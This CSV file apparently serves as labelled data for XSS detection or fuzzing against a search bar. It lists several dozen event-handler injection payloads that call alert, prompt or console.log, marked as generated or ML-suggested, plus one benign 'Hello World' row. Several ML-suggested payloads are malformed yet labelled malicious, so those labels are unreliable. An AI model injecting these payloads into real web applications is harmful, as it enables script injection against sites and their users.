"payload","source","is_malicious","notes","input_field"
"%3E%3Cimg src=x onerror=alert(fGQrx)%3E","generated","True","event-based, ""%3E%3Cimg src=x one","search_bar"
"><img src=x onerror=alert(xqQiS)>","generated","True","event-based, ""><img src=x onerror","search_bar"
"%3Cbutton onfocus=alert(bWcMw)%3E","generated","True","event-based, %3Cbutton onfocus=""a","search_bar"
"><details open ontoggle=alert(1)>","generated","True","event-based, ""><details open onto","search_bar"
"<select onchange=alert(1)>","generated","True","event-based, <select onchange=""al","search_bar"
"><input onclick=alert(1)>","generated","True","event-based, ""><input onclick=""al","search_bar"
"<marquee onstart=alert(1)>","generated","True","event-based, <marquee onstart=""al","search_bar"
">><img src=x onerror=alert(1)>","generated","True","event-based, "">""><img src=x onerr","search_bar"
"Hello World","generated","False","Non-malicious text","search_bar"
"<input onfocus=alert(uMUsm) autofocus></alert(uMUsm)","ml_suggested","True","Suggested by ML model","search_bar"
"<textarea onfocus=alert(1) autofocus><![CDATA[alert(1)","ml_suggested","True","Suggested by ML model","search_bar"
"<textarea onfocus=alert(rsWaZ) autofocus><![CDATA[alert(rsWaZ)</alert(rsWaZ)","ml_suggested","True","Suggested by ML model","search_bar"
"<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(TZZhU)","ml_suggested","True","Suggested by ML model","search_bar"
"<input onfocus=alert(uMUsm) autofocus></alert(uMUsm)</alert(TbRzd)","ml_suggested","True","Suggested by ML model","search_bar"
"<textarea onfocus=alert(PdsTf) autofocus>>alert(PdsTf)>alert(1)","ml_suggested","True","Suggested by ML model","search_bar"
"<iframe onload=eval(alert(1))>","ml_suggested","True","Suggested by ML model","search_bar"
"<input onkeydown=prompt(1)>","ml_suggested","True","Suggested by ML model","search_bar"
"<div onkeydown=console.log(XSS)<![CDATA[console.log(XSS)-->","ml_suggested","True","Suggested by ML model","search_bar"
"<marquee onfocus=alert(1)<![CDATA[alert(1)>","ml_suggested","True","Suggested by ML model","search_bar"
"<marquee id=xss onmouseover=alert(1)>","ml_suggested","True","Suggested by ML model","search_bar"
"<input onstart=alert(1)>alert(1)]]>","ml_suggested","True","Suggested by ML model","search_bar"
"<div class=xss onmouseover=prompt(1)>","ml_suggested","True","Suggested by ML model","search_bar"
"<marquee onkeydown=prompt(1)>","ml_suggested","True","Suggested by ML model","search_bar"
"<div onchange=alert(1)>","ml_suggested","True","Suggested by ML model","search_bar"
"<marquee onchange=console.log(XSS)>console.log(XSS)>","ml_suggested","True","Suggested by ML model","search_bar"
"<a onchange=alert(1)<!--alert(1)-->","ml_suggested","True","Suggested by ML model","search_bar"
"<iframe onkeydown=console.log(""XSS"")<!--console.log(""XSS"")-->","ml_suggested","True","Suggested by ML model","search_bar"
"<marquee onchange=console.log(""XSS"")>","ml_suggested","True","Suggested by ML model","search_bar"
"<textarea onkeydown=eval(""alert(1)"")<!--eval(""alert(1)"")"">","ml_suggested","True","Suggested by ML model","search_bar"
"<iframe style=""display:none"" onchange=eval(""alert(1)"")>","ml_suggested","True","Suggested by ML model","search_bar"
